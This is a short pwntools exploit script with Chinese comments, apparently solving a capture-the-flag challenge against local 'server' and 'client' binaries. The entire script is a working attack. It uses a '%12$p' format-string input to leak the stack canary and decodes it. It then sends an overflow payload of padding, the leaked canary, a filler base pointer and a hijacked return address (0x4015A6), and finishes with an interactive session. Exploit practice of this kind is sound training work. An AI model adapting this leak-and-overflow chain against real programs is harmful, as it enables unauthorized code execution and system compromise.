from pwn import *
import re
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.os = 'linux'
ld_name = './ld-linux-x86-64.so.2'
p = process([ld_name, '--library-path', '.', './server'])

io = process([ld_name, '--library-path', '.', './client'])
pd = b'1'
io.sendline(pd)
pd = b'%12$p'
io.sendline(pd)
io.recvuntil(b'[Leaked data (hex)]: ')
hex_str = io.recvline().strip().decode()

# 你收到的是ASCII字符的hex编码，先转换回原始字符串
raw_bytes = bytes.fromhex(hex_str.replace(' ', ''))
original_str = raw_bytes.decode('ascii', errors='ignore').rstrip('\x00\x0a\x0d\x7f')

print(f"Original string: {original_str}")

# 提取0x后的部分
match = re.search(r'0x([0-9a-fA-F]+)', original_str)
if match:
    canary_hex = match.group(1)
    print(f"Extracted hex: {canary_hex}")
    
    # 确保是16位（8字节），右对齐补0
    canary_hex = canary_hex.rjust(16, '0')[-16:]  # 取最后16位
    print(f"Padded hex: {canary_hex}")
    canary = int(canary_hex, 16)
    print(f"Canary value: {hex(canary)}")
    

#pause()
io.recvuntil(b'3. Exit')
pd = b'2'
io.sendline(pd)
#payload = b'a' * 0x88 
payload = b'a' * 0x28 + p64(canary) + p64(0xdeadbeef) + p64(0x4015A6)
io.sendline(payload)
io.interactive()
